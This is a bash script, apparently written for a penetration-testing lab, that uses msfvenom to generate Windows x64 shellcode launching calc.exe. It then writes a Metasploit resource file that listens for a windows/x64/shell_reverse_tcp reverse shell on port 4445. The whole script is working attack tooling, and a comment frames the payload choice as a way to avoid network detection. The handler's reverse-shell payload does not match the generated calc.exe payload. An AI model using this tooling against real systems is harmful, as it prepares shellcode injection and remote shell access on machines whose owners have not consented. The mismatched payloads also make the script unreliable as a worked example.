#!/bin/bash
# Generate calc.exe shellcode using msfvenom - MEETS OUTLINE REQUIREMENT

echo "=== Generating Shellcode with msfvenom ==="
echo "[*] Creating calc.exe payload to avoid network detection"
echo ""

# Get Kali IP
IP=$(hostname -I | awk '{print $1}')
echo "[*] Kali IP: $IP"

# Generate calc.exe shellcode using msfvenom
echo "[*] Generating shellcode with msfvenom..."
msfvenom -p windows/x64/exec CMD=calc.exe -f python -v shellcode -o shellcode.py

if [ $? -eq 0 ]; then
    echo "[+] Generated shellcode.py"
    SIZE=$(wc -c < shellcode.py)
    echo "[+] Shellcode file size: $SIZE bytes"
else
    echo "[-] Failed to generate shellcode"
    exit 1
fi

echo ""

# Create handler for simple shell
cat > injection_handler.rc << EOF
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4445
set ExitOnSession false
exploit -j
EOF

echo "[+] Created injection_handler.rc"
echo ""
